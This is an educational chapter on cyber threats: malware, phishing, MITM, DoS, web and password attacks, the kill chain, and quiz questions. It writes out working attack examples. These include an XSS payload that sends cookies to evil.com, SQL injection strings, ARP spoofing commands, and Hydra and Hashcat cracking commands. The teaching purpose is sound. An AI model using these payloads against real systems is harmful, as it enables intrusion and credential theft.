# 06. Cyber Threats & Attacks

## Table of Contents
- [6.1 Malware Types](#61-malware-types)
- [6.2 Social Engineering](#62-social-engineering)
- [6.3 Network Attacks](#63-network-attacks)
- [6.4 Web Application Attacks](#64-web-application-attacks)
- [6.5 Password Attacks](#65-password-attacks)
- [6.6 Advanced Threats](#66-advanced-threats)
- [6.7 Attack Lifecycle (Kill Chain)](#67-attack-lifecycle-kill-chain)
- [6.8 Common Mistakes & Interview Tips](#68-common-mistakes--interview-tips)
- [6.9 Practice & Assessment](#69-practice--assessment)

---

## 6.1 Malware Types

### Definition
**Malware** (malicious software) is any software designed to harm, exploit, or gain unauthorized access to a computer system.

### Malware Classification

| Type | How It Works | Spreads? | Needs Host? | Example |
|------|-------------|----------|-------------|---------|
| **Virus** | Attaches to legitimate files, runs when file is opened | Yes (via files) | Yes | ILOVEYOU, Melissa |
| **Worm** | Self-replicates across networks without user action | Yes (network) | No | WannaCry, Conficker |
| **Trojan** | Disguises as legitimate software | No (user installs) | Yes | Zeus, Emotet |
| **Ransomware** | Encrypts files, demands payment | Varies | No | WannaCry, LockBit, REvil |
| **Spyware** | Secretly monitors user activity | No | Yes | Pegasus, FinFisher |
| **Adware** | Displays unwanted ads | No | Yes | Fireball |
| **Rootkit** | Hides deep in OS, gives attacker persistent access | No | Yes | Sony rootkit, ZeroAccess |
| **Keylogger** | Records keystrokes (passwords, messages) | No | Yes | Ardamax |
| **Botnet** | Network of infected machines controlled remotely | Yes | No | Mirai, Emotet |
| **Fileless Malware** | Lives in memory, no files on disk | No | No | PowerShell-based attacks |

### How Malware Works — Step by Step

```
1. DELIVERY
   → Phishing email with attachment
   → Malicious website download
   → Infected USB drive
   → Compromised software update

2. EXECUTION
   → User opens infected file
   → Exploit triggers automatically
   → Macro in document runs

3. INSTALLATION
   → Malware installs itself
   → Creates persistence (startup entry)
   → Disables antivirus

4. ACTION
   → Steals data (spyware)
   → Encrypts files (ransomware)
   → Opens backdoor (trojan)
   → Spreads to other systems (worm)
```

### Ransomware Attack Flow

```
Attacker                              Victim
   │                                     │
   │── Phishing email ──────────────────►│
   │                                     │── Opens attachment
   │                                     │── Malware executes
   │                                     │── Files encrypted 🔒
   │                                     │
   │◄── "Pay 2 BTC to unlock" ──────────│
   │                                     │
   │── [If paid] Decryption key ────────►│  (Maybe. No guarantee!)
```

### Detection & Prevention

| Malware Type | Detection Method | Prevention |
|-------------|-----------------|------------|
| Virus | Signature-based AV | Don't open unknown files |
| Worm | Network anomaly detection | Patch systems, segment network |
| Trojan | Behavior-based detection | Download from trusted sources only |
| Ransomware | Canary files, behavior monitoring | Backups (3-2-1 rule), email filtering |
| Rootkit | Integrity checking, offline scanning | Secure boot, UEFI protection |

### Commands — Malware Investigation (Linux)

```bash
# Check running processes for suspicious activity
ps aux | grep -i suspicious
top -c

# Check network connections (malware phone-home)
ss -tuln
netstat -antp

# Check startup persistence
cat /etc/rc.local
ls /etc/init.d/
systemctl list-unit-files --type=service | grep enabled
crontab -l

# Check for rootkits
sudo chkrootkit
sudo rkhunter --check

# File hash check (is this file malicious?)
sha256sum suspicious_file.exe
# Compare hash on VirusTotal.com
```

---

## 6.2 Social Engineering

### Definition
**Social engineering** manipulates PEOPLE (not systems) into giving up confidential information or performing actions that compromise security.

> "The weakest link in security is always the human."

### Types of Social Engineering

| Attack | Method | Example |
|--------|--------|---------|
| **Phishing** | Fake emails pretending to be legitimate | "Your bank account is locked. Click here to verify." |
| **Spear Phishing** | Targeted phishing at specific person | Email to CEO pretending to be CFO |
| **Whaling** | Phishing targeting executives | Fake legal subpoena to CEO |
| **Vishing** | Voice phishing (phone calls) | "This is Microsoft. Your computer has a virus." |
| **Smishing** | SMS phishing | "Your package is delayed. Track here: [link]" |
| **Pretexting** | Creating a fake story/scenario | "Hi, I'm from IT. I need your password to fix your account." |
| **Baiting** | Leaving infected media to be found | USB drive labeled "Salary Report 2024" in parking lot |
| **Tailgating** | Following someone through secure door | Walking into office behind an employee |
| **Quid Pro Quo** | Offering something in exchange | "Free antivirus scan" that installs malware |
| **Watering Hole** | Infecting websites the target visits | Compromising industry forum with exploit |

### Phishing Email Red Flags

```
From: security@bank-secure-verify.com  ← Wrong domain!
To: you@email.com
Subject: URGENT: Account Suspended! ← Creating urgency

Dear Valued Customer,  ← Generic greeting (not your name)

Your account has been suspended due to suspicious activity.
Click below to verify your identity immediately:

[Verify Now] → https://bank-secure-verify.com/login  ← Fake URL!

Failure to verify within 24 hours will result in permanent
account closure.  ← Threatening consequences

Bank Security Team
```

### Prevention

```
✅ Verify sender's email address carefully
✅ Hover over links before clicking (check URL)
✅ Never give passwords over phone/email
✅ Use MFA (even if password is stolen, attacker can't login)
✅ When in doubt, contact the organization directly
✅ Security awareness training for employees
✅ Email filtering and anti-phishing tools
```

---

## 6.3 Network Attacks

### Man-in-the-Middle (MITM)

**What:** Attacker secretly intercepts communication between two parties.

```
Normal:     Alice ◄────────────────────► Bob
MITM:       Alice ◄──► [Attacker] ◄──► Bob
                        Reads/modifies
                        all traffic
```

**How it works (ARP Spoofing):**
```bash
# Attacker tells Victim: "I am the gateway"
# Attacker tells Gateway: "I am the victim"
# All traffic now flows through attacker

# Tool: arpspoof (for educational/authorized testing ONLY)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Enable IP forwarding (so traffic still flows)
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Prevention:** Use HTTPS, VPN, static ARP entries, Dynamic ARP Inspection (DAI).

### DoS & DDoS Attacks

**DoS** (Denial of Service): ONE attacker overwhelms a target.  
**DDoS** (Distributed DoS): THOUSANDS of compromised machines (botnet) attack simultaneously.

```
DoS:
  Attacker ═══════════════► Target Server (overwhelmed)

DDoS:
  Bot 1 ───►
  Bot 2 ───►
  Bot 3 ───► Target Server (overwhelmed)
  Bot 4 ───►
  ...10,000+ bots
```

**Types of DoS/DDoS:**

| Type | Layer | Method |
|------|-------|--------|
| SYN Flood | Transport (L4) | Send thousands of SYN packets, never complete handshake |
| UDP Flood | Transport (L4) | Flood with UDP packets to random ports |
| HTTP Flood | Application (L7) | Overwhelm web server with GET/POST requests |
| Ping of Death | Network (L3) | Oversized ICMP packets |
| Slowloris | Application (L7) | Keep connections open with partial requests |
| DNS Amplification | Application | Small query → large response to spoofed victim IP |

**Prevention:** Rate limiting, CDN (Cloudflare), DDoS protection services, SYN cookies.

### DNS Attacks

| Attack | Description |
|--------|-------------|
| **DNS Spoofing** | Inject fake DNS records → victim goes to wrong IP |
| **DNS Cache Poisoning** | Corrupt DNS resolver's cache with fake entries |
| **DNS Tunneling** | Hide data inside DNS queries to bypass firewalls |
| **DNS Hijacking** | Change DNS settings on router/device |

```bash
# Check DNS resolution
nslookup example.com
dig example.com

# Check for DNS hijacking — compare with known DNS
nslookup example.com 8.8.8.8        # Google DNS
nslookup example.com 1.1.1.1        # Cloudflare DNS
# If results differ from your ISP DNS → possible hijacking
```

---

## 6.4 Web Application Attacks

### SQL Injection (SQLi)

**What:** Injecting SQL code through user input to manipulate the database.

```
Normal login:
  Username: admin
  Password: mypassword
  Query: SELECT * FROM users WHERE user='admin' AND pass='mypassword'

SQL Injection:
  Username: admin' --
  Password: anything
  Query: SELECT * FROM users WHERE user='admin' --' AND pass='anything'
                                                 ↑
                                          Comments out password check!
```

**Types of SQLi:**

| Type | Description | Example |
|------|-------------|---------|
| In-band (Classic) | Results visible on page | `' OR '1'='1` |
| Error-based | Database errors reveal info | `' AND 1=CONVERT(int, @@version) --` |
| Blind (Boolean) | True/false responses only | `' AND 1=1 --` vs `' AND 1=2 --` |
| Time-based Blind | Response delay indicates true/false | `' AND IF(1=1, SLEEP(5), 0) --` |

**Prevention:** Parameterized queries, input validation, WAF, least-privilege DB accounts.

### Cross-Site Scripting (XSS)

**What:** Injecting malicious JavaScript into web pages viewed by other users.

```html
<!-- Vulnerable search page -->
<p>Results for: <?php echo $_GET['q']; ?></p>

<!-- Attacker's URL -->
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- What victim's browser sees -->
<p>Results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>
<!-- Browser EXECUTES the script! Cookies stolen! -->
```

**Prevention:** Output encoding, Content Security Policy (CSP), HttpOnly cookies.

### Cross-Site Request Forgery (CSRF)

**What:** Force an authenticated user to perform actions they didn't intend.

```
Victim is logged into bank.com

Attacker sends victim a link/email with hidden form:
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

Victim's browser sends the request WITH their session cookie.
Bank processes the transfer — victim never knew!
```

**Prevention:** Anti-CSRF tokens, SameSite cookies, re-authentication for sensitive actions.

---

## 6.5 Password Attacks

| Attack | Method | Speed | Prevention |
|--------|--------|-------|------------|
| **Brute Force** | Try every possible combination | Slow | Account lockout, long passwords |
| **Dictionary** | Try common words/passwords | Medium | Complex passwords |
| **Rainbow Table** | Precomputed hash lookup | Fast | Salted hashes |
| **Credential Stuffing** | Leaked username:password pairs | Fast | MFA, unique passwords |
| **Password Spraying** | One password, many accounts | Slow | Lockout policies, monitoring |
| **Keylogger** | Record keystrokes | Real-time | Anti-keylogger, virtual keyboard |
| **Shoulder Surfing** | Watch someone type | Real-time | Screen privacy filter |

### Password Cracking Tools (Ethical Use Only)

```bash
# John the Ripper — crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat — GPU-accelerated cracking
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5, -m 1000 = NTLM, -m 1800 = SHA-512

# Hydra — online brute force (login forms, SSH, FTP)
hydra -l admin -P passwords.txt 192.168.1.100 ssh
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

## 6.6 Advanced Threats

### Zero-Day Attack
A vulnerability that is **unknown to the vendor** — no patch exists yet.

```
Timeline:
  Day 0: Vulnerability discovered by attacker (or researcher)
  Day 0: Exploit created and used (if attacker)
  Day X: Vendor discovers the vulnerability
  Day Y: Patch released
  
  Window of exposure: Day 0 to Day Y → "Zero-day window"
```

### Advanced Persistent Threat (APT)
A **long-term**, stealthy attack by well-funded groups (often state-sponsored).

```
Characteristics:
  • Highly targeted (specific organization)
  • Uses multiple attack vectors
  • Maintains access for months/years
  • Goal: espionage, not quick profit
  • Extremely difficult to detect
  
Examples: APT28 (Fancy Bear), APT41 (China), Lazarus Group (North Korea)
```

### Supply Chain Attack
Compromising a trusted **vendor or software provider** to reach the actual target.

```
Normal:    Vendor ──[trusted update]──► 10,000 Customers
Attack:    Attacker ──► Vendor ──[infected update]──► 10,000 Customers

Example: SolarWinds (2020)
  → Attackers compromised SolarWinds' build process
  → Malicious code inserted into Orion software update
  → 18,000+ organizations installed the infected update
  → Including US government agencies
```

---

## 6.7 Attack Lifecycle (Kill Chain)

```
┌──────────────────────────────────────────────────────────────┐
│                    CYBER KILL CHAIN                            │
├──────────┬───────────────────────────────────────────────────┤
│ Phase 1  │ RECONNAISSANCE — Research target (OSINT, scanning)│
├──────────┼───────────────────────────────────────────────────┤
│ Phase 2  │ WEAPONIZATION — Create exploit + payload          │
├──────────┼───────────────────────────────────────────────────┤
│ Phase 3  │ DELIVERY — Send to target (email, web, USB)       │
├──────────┼───────────────────────────────────────────────────┤
│ Phase 4  │ EXPLOITATION — Trigger vulnerability              │
├──────────┼───────────────────────────────────────────────────┤
│ Phase 5  │ INSTALLATION — Install backdoor/malware           │
├──────────┼───────────────────────────────────────────────────┤
│ Phase 6  │ C2 (Command & Control) — Establish comms          │
├──────────┼───────────────────────────────────────────────────┤
│ Phase 7  │ ACTIONS ON OBJECTIVE — Steal data, destroy        │
└──────────┴───────────────────────────────────────────────────┘

DEFENDER'S GOAL: Break the chain as EARLY as possible!
  Phase 1: Limit public info, monitor for recon
  Phase 3: Email filtering, endpoint protection
  Phase 4: Patching, vulnerability management
  Phase 5: AV/EDR, application whitelisting
  Phase 6: Network monitoring, DNS filtering
```

---

## 6.8 Common Mistakes & Interview Tips

### Common Mistakes

| Mistake | Correction |
|---------|-----------|
| Thinking antivirus alone is enough | AV is ONE layer; use defense-in-depth |
| Ignoring social engineering | Humans are the weakest link; train them |
| Not updating/patching | 60% of breaches involve unpatched vulnerabilities |
| Using same password everywhere | One breach = all accounts compromised |
| Trusting any email/link | Verify sender, hover before clicking |

### Interview Questions

**Q: What is the difference between a virus and a worm?**
> A virus attaches to files and needs user action to spread. A worm self-replicates across networks without user interaction.

**Q: Explain a MITM attack.**
> The attacker positions themselves between two communicating parties, intercepting and potentially modifying traffic. Common via ARP spoofing on local networks.

**Q: What is a zero-day vulnerability?**
> A vulnerability unknown to the software vendor, for which no patch exists. It's called "zero-day" because the vendor has had zero days to fix it.

**Q: How does SQL injection work?**
> Attacker inserts SQL code into input fields. If the application doesn't properly validate/sanitize input, the SQL executes on the database, allowing data theft or manipulation.

---

## 6.9 Practice & Assessment

### MCQs

**Q1.** A self-replicating malware that spreads without user action is:
- A) Virus
- B) Trojan
- C) Worm
- D) Adware

**Answer:** C) Worm

---

**Q2.** Which attack manipulates people rather than technology?
- A) SQL Injection
- B) Social Engineering
- C) Buffer Overflow
- D) DDoS

**Answer:** B) Social Engineering

---

**Q3.** In SQL injection, `' OR '1'='1` works because:
- A) It crashes the database
- B) It always evaluates to TRUE, bypassing authentication
- C) It encrypts the password
- D) It deletes the table

**Answer:** B) It always evaluates to TRUE, bypassing authentication

---

**Q4.** A DDoS attack differs from DoS because:
- A) DDoS uses encryption
- B) DDoS comes from multiple sources
- C) DDoS is legal
- D) DDoS only targets DNS

**Answer:** B) DDoS comes from multiple sources

---

**Q5.** The SolarWinds attack is an example of:
- A) Phishing
- B) Brute force
- C) Supply chain attack
- D) SQL injection

**Answer:** C) Supply chain attack

---

### Scenario-Based Questions

**Scenario 1:** An employee receives an email from "IT Support" asking them to click a link and enter their password to "verify their account." The email domain is `it-support-verify.com` instead of the company domain. What attack is this?
> **Answer:** Phishing (specifically spear phishing if targeted). Red flags: external domain, urgency, asking for credentials.

**Scenario 2:** A company notices that 10,000 login attempts occurred on their VPN in 1 hour, all using different usernames but the same password "Spring2024!". What attack is this?
> **Answer:** Password spraying. The attacker tries one common password across many accounts to avoid lockout.

**Scenario 3:** After a breach, investigators find that the malware had no files on disk — it lived entirely in memory and used PowerShell for execution. What type of malware is this?
> **Answer:** Fileless malware. It's hard to detect because traditional AV looks for files. Detection requires behavior-based analysis and memory forensics.

---

> **Next Topic:** [07 - Cryptography](07-cryptography.md)
